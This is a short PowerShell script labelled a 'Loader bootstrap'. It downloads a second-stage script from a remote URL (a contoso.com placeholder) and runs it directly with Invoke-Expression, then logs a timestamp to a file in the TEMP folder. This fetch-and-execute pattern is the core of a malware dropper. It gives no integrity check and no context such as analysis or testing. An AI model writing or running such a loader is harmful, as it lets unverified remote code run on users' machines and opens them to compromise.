<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://contoso.com/stage2.ps1",
    [int]$TimeoutSec = 117
)
IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
